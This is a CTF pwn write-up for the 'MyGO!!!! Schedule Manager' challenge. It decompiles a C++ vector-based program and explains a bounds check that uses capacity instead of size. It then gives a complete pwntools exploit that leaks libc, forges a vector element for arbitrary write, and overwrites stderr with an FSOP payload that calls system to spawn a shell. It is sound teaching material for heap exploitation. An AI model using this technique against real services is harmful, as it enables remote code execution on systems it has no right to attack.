# MyGO!!!! Schedule Manager
> Author: 堇姬Naup

## analyze IDA
```cpp
unsigned __int64 login(void)
{
  char Username[16]; // [rsp+0h] [rbp-30h] BYREF
  char Password[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Username > ");
  __isoc99_scanf("%15s", Username);
  printf("Password > ");
  __isoc99_scanf("%15s", Password);
  if ( strcmp(Username, "MyGO!!!!!") || strcmp(Password, "TomorinIsCute") )
  {
    puts("[x] Verify Failed");
    exit(0);
  }
  puts("[!] Welcome MyGO!!!!!");
  puts("[!] This is a system that can manage your band schedule.");
  return v3 - __readfsqword(0x28u);
}
```
First, you need to login. Just input `MyGO!!!!!` in username and `TomorinIsCute` in password.

And then you will look four function about manipulate schedule.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+8h] [rbp-8h]
  int index; // [rsp+Ch] [rbp-4h]

  init_proc();
  login();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = get_choice();
      if ( choice != 1 )
        break;
      add_scedule();
    }
    if ( choice != 2 && choice != 3 && choice != 4 )
      break;
    index = get_index();
    if ( choice == 2 )
    {
      edit_schedule(index);
    }
    else if ( choice == 3 )
    {
      delete_schedule(index);
    }
    else
    {
      show_schedule(index);
    }
  }
  printf("[!] Thanks ~ ");
  return 0;
}
```
1 -> add
2 -> edit
3 -> delete
4 -> show

Trace this code.
```c
unsigned __int64 add_scedule(void)
{
  _BYTE v1[40]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-18h]

  v2 = __readfsqword(0x28u);
  if ( (unsigned __int64)std::vector<std::string>::size(&schedule[abi:cxx11]) <= 4 )
  {
    get_string[abi:cxx11]((__int64)v1);
    std::vector<std::string>::emplace_back<std::string>(&schedule[abi:cxx11], v1);
    std::string::~string(v1);
    puts("[+] add success!");
  }
  else
  {
    puts("[!] schedule is full. Don't let Tomorin so tired...");
  }
  return v2 - __readfsqword(0x28u);
}
```
`add_schedule` need to input a string which you want to emplace_back to schedule (std::vector<std::string>).
It'll check scedule not bigger than 4.

```c
int __fastcall edit_schedule(int a1)
{
  __int64 v3; // rax

  if ( a1 > (unsigned __int64)std::vector<std::string>::capacity(&schedule[abi:cxx11]) || a1 < 0 )
    return puts("[x] schedule is not exist");
  std::istream::ignore((std::istream *)&std::cin);
  printf("Edit item > ");
  v3 = std::vector<std::string>::operator[](&schedule[abi:cxx11], a1);
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v3);
  return puts("[+] Edit success!");
}
```
`edit_schedule` it need to two input. `index` and `string` 
It will edit schedule[index] to your input string.
And it will check your input not bigger than vector capacity(It is so strange, but let me later to descript it. It is this challenge core) 

```c
unsigned __int64 __fastcall delete_schedule(int a1)
{
  __int64 v3; // [rsp+10h] [rbp-30h] BYREF
  __int64 v4; // [rsp+18h] [rbp-28h] BYREF
  __int64 v5; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  if ( a1 > (unsigned __int64)std::vector<std::string>::capacity(&schedule[abi:cxx11]) || a1 < 0 )
  {
    puts("[x] schedule is not exist");
  }
  else
  {
    v3 = std::vector<std::string>::begin(&schedule[abi:cxx11]);
    v4 = __gnu_cxx::__normal_iterator<std::string *,std::vector<std::string>>::operator+(&v3, a1);
    __gnu_cxx::__normal_iterator<std::string const*,std::vector<std::string>>::__normal_iterator<std::string*>(&v5, &v4);
    std::vector<std::string>::erase(&schedule[abi:cxx11], v5);
    puts("[-] delete success!");
  }
  return v6 - __readfsqword(0x28u);
}
```
`delete_schedule` is look like previous function.
User need to input index, it will erase vector.begin()+index.
This part check is the same, it check vector capacity.

```c
int __fastcall show_schedule(unsigned int a1)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rax
  __int64 v7; // rax

  if ( (int)a1 > (unsigned __int64)std::vector<std::string>::capacity(&schedule[abi:cxx11]) || (a1 & 0x80000000) != 0 )
    return puts("[x] schedule is not exist");
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Index [");
  v4 = std::ostream::operator<<(v3, a1);
  v5 = std::operator<<<std::char_traits<char>>(v4, "] is ");
  v6 = std::vector<std::string>::operator[](&schedule[abi:cxx11], (int)a1);
  v7 = std::operator<<<char>(v5, v6);
  return std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
}
```
Last function is show_schedule. It will show your schedule's string content.
And check is vector capacity.

## Some Knowledge
First we need to know `std::vector` and `std::string` structure.
This is std::vector
| offset | description |
|--------|-------------|
| 0x0 | pointer to the first element of the array |
| 0x8 | vector end pointer |
| 0x10 | pointer to the capacity limit of the array  |

Anthor is std::string
| offset | description |
|--------|-------------|
| 0x0    | pointer to the data (first element of the array) |
| 0x8    | size of the vector (number of elements currently stored) |
| 0x10   | capacity of the vector (total capacity, or pointer to the array end) |
| 0x18   | unused padding or alignment space |

OK, now you need to know vector capacity.
When vector need to let its capacity more bigger?
The answer is $2^n, n \in \{ 0, 1, 2, 3, \dots \}$
If it need to expand its capacity.
It will free origin chunk which store vector elements structure.
And alloc new chunk.

## analyze bug
We know vector's capacity will be expanded in advanced.
So, when vector elements count is 3.
Its capacity is four.

It will access out of vector's have element part.
So first we alloc 0x500 size std::string, and alloc 0x10 size(When you free 0x500, let your unsorted bin not consolidate to top chunk.)
And free 0x10 and free 0x500.
And you show chunk 0x500, fd and bk's libc address will be show.
We will leak libc

And we alloc one chunk, and input it like a fake vector (4 elements).
Fourth element 0x0 change to `You want to write address` (This is pointer point to data), and free this chunk.

Alloc three chunk:
When you alloc third chunk, vector capacity will be expanded to 4 and alloc new chunk store element struct.
In advanced, you have been freed a fake chunk will be catch to use and fourth element have been put fake vector which point to `You want to write address`.

And it check use capacity, so we can access this fake pointer.
So we will get arbitrary write.

We write FSOP on stderr. We will get shell.
This is my script

## script
```python=
from pwn import *
from libs.NAUP_pwn_lib import *
import time
from libs.NAUP_filestructure_lib import *
from libs.NAUP_fmt_lib import *

#### This is a CTF pwn templates make by Naup

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()
def tsl(): return time.sleep(0.2)

x64_env()

REMOTE_LOCAL=input("local?(y/n):")

if REMOTE_LOCAL=="y":
    r=process('./chal')
    debug_init()
    
else:                                           
    REMOTE_INFO=split_nc("nc naup.com 2000")

    REMOTE_IP=REMOTE_INFO[0]
    REMOTE_PORT=int(REMOTE_INFO[1])

    r=remote(REMOTE_IP,REMOTE_PORT)

### attach
if input('attach?(y/n)') == 'y':
    p(r)

### heap IO
def login():
    sla(b"Username > ", b"MyGO!!!!!")
    sla(b"Password > ", b"TomorinIsCute")

def add(item):
    sla(b"< MyGO @ ScheduleManager $ > ", b"1")
    sla(b"Input item > ", item)

def edit(idx, item):
    sla(b"< MyGO @ ScheduleManager $ > ", b"2")
    sla(b"Index > ", str(idx).encode())
    sla(b"Edit item > ", item)

def delete(idx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"3")
    sla(b"Index > ", str(idx).encode())

def show(idx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"4")
    sla(b"Index > ", str(idx).encode())

def exitf():
    sla(b"< MyGO @ ScheduleManager $ > ", b"5")

### exploit

login()
add(b"a" * 0x500)
add(b"b" * 0x10)
delete(1)
delete(0)

show(0)
r.recvuntil(b'] is ')
leaklibc = u64(r.recvline().strip()[:6].ljust(8,b'\x00'))
libcbase = leaklibc - 0x21ace0

IO_STDERR = libcbase + 0x21b6a0
libc_system = libcbase + 0x50d70 

payload1  = p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(IO_STDERR) + p64(0x1d0) + p64(0x1d0) + p64(0)

add(payload1)
delete(0)

add(b'Tomorin')
add(b'Soyorin')
add(b'Rana')

payload2 =  p32(0xfbad0101) + b";sh\x00" + b'\x00' * (0x50)
payload2 += p64(libc_system) + b'\x00' * (0x28)
payload2 += p64(IO_STDERR - 0x10) + b'\x00' * (0x10)
payload2 += p64(IO_STDERR - 0x10) + b'\x00' * 0x18
payload2 += p32(1) + b'\x00' * (0xc)
payload2 += p64(IO_STDERR - 0x10) + p64(libcbase + 0x217078) 

edit(3, payload2)
exitf()


NAUPINFO("LEAKLIBC", hex(leaklibc))
NAUPINFO("LIBCBASE", hex(libcbase))
NAUPINFO('STD ERROR', hex(IO_STDERR))
### interactive
ita()
```






